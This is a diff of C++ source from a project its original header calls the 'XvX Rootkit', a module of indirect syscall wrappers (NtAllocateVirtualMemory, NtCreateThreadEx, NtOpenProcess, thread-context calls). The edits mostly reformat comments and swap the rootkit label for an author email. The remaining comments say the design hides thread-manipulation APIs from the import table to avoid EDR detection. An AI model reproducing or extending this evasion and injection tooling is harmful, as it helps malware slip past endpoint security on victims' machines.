@@ -1,4 +1,4 @@
-// XvX Rootkit - Indirect syscalls for EDR-resistant kernel invocation
+// By 28zaakypro@proton.me
 
 #include "IndirectSyscalls.h"
 #include "StringObfuscation.h"
@@ -199,12 +199,7 @@ void IndirectSyscalls::Cleanup() {
     g_State.Initialized = FALSE;
 }
 
-/*
- * =========================================
- * SYSCALL WRAPPERS
- * =========================================
- */
-
+// SYSCALL WRAPPERS
 NTSTATUS IndirectSyscalls::SysNtAllocateVirtualMemory(
     HANDLE ProcessHandle,
     PVOID* BaseAddress,
@@ -283,10 +278,6 @@ NTSTATUS IndirectSyscalls::SysNtCreateThreadEx(
     PVOID AttributeList
 ) {
     if (!g_State.Initialized) return -1;
-
-    // Thread creation syscall - 11 parameters total
-    // First 6 go through DoSyscall wrapper, rest must be on stack
-    // This is a simplified version - for production, might need extended wrapper
     
     return DoSyscall(
         g_SSNs.NtCreateThreadEx,
@@ -298,8 +289,6 @@ NTSTATUS IndirectSyscalls::SysNtCreateThreadEx(
         StartRoutine,
         Argument
     );
-    // Note: CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList
-    // not passed - this wrapper is simplified for basic thread creation
 }
 
 NTSTATUS IndirectSyscalls::SysNtOpenProcess(
@@ -378,13 +367,11 @@ NTSTATUS IndirectSyscalls::SysNtClose(HANDLE Handle) {
     );
 }
 
-/*
- * ============================================================
- *  THREAD MANIPULATION SYSCALLS (replaces KERNEL32 IAT)
- * ============================================================
- * These syscalls eliminate GetThreadContext, SetThreadContext,
- * SuspendThread, ResumeThread from IAT to avoid EDR detection
- */
+
+// THREAD MANIPULATION SYSCALLS (replaces KERNEL32 IAT)
+
+// These syscalls eliminate GetThreadContext, SetThreadContext,
+// SuspendThread, ResumeThread from IAT to avoid EDR detection
 
 NTSTATUS IndirectSyscalls::SysNtGetContextThread(
     HANDLE ThreadHandle,
